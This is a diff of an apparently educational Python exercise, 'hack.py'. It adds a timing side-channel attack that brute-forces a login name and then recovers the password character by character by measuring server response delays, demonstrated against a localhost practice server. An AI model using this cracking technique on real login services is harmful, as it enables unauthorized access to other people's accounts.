@@ -1,9 +1,11 @@
+import cProfile
 import os
 import json
 import socket
 import sys
 import itertools
 import string
+import timeit
 
 
 def generate_passwords(length):
@@ -165,6 +167,27 @@ def main():
     > python hack.py localhost 9090
     {"login": "new_user", "password": "Sg967s"}
     """
+    """
+    (五) 破解基于时间的漏洞
+    管理员改进了服务器：程序现在可以捕获异常并向客户端发送简单的“错误密码”消息，即使真实密码以当前符号开头。
+    但问题是：管理员刚刚捕获了这个异常。捕获异常需要计算机很长时间，因此当发生此异常时，服务器响应中会有延迟。
+    您可以使用它来破解系统：计算响应出现的时间段，并找出哪些起始符号可以用作密码。
+
+    在这个阶段，你应该编写一个使用时间漏洞来查找密码的程序。
+    1. 使用上一阶段的登录名列表。
+    2. 输出结果，就像在上一阶段中所做的那样。
+
+    例子1：
+    > python hack.py localhost 9090
+    {
+        "login" : "su",
+        "password" : "fTUe3O99Rre"
+    }
+
+    例子2：
+    > python hack.py localhost 9090
+    {"login": "admin3", "password": "mlqDz33x"}
+    """
     if len(sys.argv) != 3:
         print("Usage: python hack.py <IP address> <port> <message>")
         return
@@ -192,38 +215,47 @@ def main():
             result = json.loads(reply).get("result", "")
 
             # 登录名对了
-            if result in {"Wrong password!", "Exception happened during login"}:
+            if result in {"Wrong password!"}:
                 correct_login = login
+                break
 
         if correct_login is None:
             print("未找到有效登录名")
             return
 
-        # ---------------- 2. 利用异常侧信道逐字符扩展密码 ----------------
+        # ---------------- 2. 利用时间侧信道逐字符扩展密码 ----------------
         pwd_prefix = ''
         CHARS = string.ascii_letters + string.digits
 
         while True:
+            timings = []
             for ch in CHARS:
                 # 发送密码
-                attempt = {"login": correct_login, "password": pwd_prefix + ch}
+                attempt_pwd = pwd_prefix + ch
+                attempt = {"login": correct_login, "password": attempt_pwd}
+
+                start_time = timeit.default_timer()
                 sock.sendall(json.dumps(attempt).encode('utf-8'))
                 reply = sock.recv(1024).decode('utf-8').strip()
+                elapsed_time = timeit.default_timer() - start_time
+
                 result = json.loads(reply).get("result", "")
 
                 if result == "Connection success!":
                     # 成功！
                     print(json.dumps(attempt, ensure_ascii=False))
                     return
-                if result == "Exception happened during login":
-                    # 前缀匹配正确，继续扩展
-                    pwd_prefix += ch
-                    break
-            else:
-                # 所有字符都试完仍未命中 => 异常
-                print("密码空间穷尽却未成功，可能协议/逻辑错误")
+                
+                timings.append((elapsed_time, ch))
+
+            # 选用耗时最长的字符作为下一位前缀
+            if not timings:
+                print("未收到任何回复，终止。")
                 return
-            # 跳出 for ch 循环，进入下一位
+
+            _, next_char = max(timings, key=lambda t: t[0])
+            pwd_prefix += next_char
+            
 
 
 if __name__ == "__main__":
